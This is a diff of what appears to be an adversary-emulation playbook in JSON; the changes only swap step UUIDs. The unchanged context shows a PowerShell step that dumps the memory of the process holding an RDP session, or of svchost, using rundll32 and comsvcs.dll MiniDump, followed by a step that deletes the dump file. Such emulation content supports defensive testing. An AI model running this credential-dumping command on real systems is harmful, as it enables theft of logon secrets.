@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "dd4080a0-c68c-46e0-9a75-4514914bd23b",
+      "id": "9c796fb1-7dc1-52b8-8e13-1a6c35e9deb4",
       "type": "execute-command",
       "data": {
         "command": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\nC:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "f20d28cf-c6e2-4aba-8d28-64f056333626",
+      "id": "b01086e8-3d30-59c2-8e3b-637d26d8101a",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item $env:TEMP\\svchost-exe.dmp -ErrorAction Ignore",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "dd4080a0-c68c-46e0-9a75-4514914bd23b",
+      "s": "9c796fb1-7dc1-52b8-8e13-1a6c35e9deb4",
       "p": "on-success",
-      "o": "f20d28cf-c6e2-4aba-8d28-64f056333626"
+      "o": "b01086e8-3d30-59c2-8e3b-637d26d8101a"
     },
     {
-      "s": "dd4080a0-c68c-46e0-9a75-4514914bd23b",
+      "s": "9c796fb1-7dc1-52b8-8e13-1a6c35e9deb4",
       "p": "on-failure",
-      "o": "f20d28cf-c6e2-4aba-8d28-64f056333626"
+      "o": "b01086e8-3d30-59c2-8e3b-637d26d8101a"
     }
   ],
   "tags": [
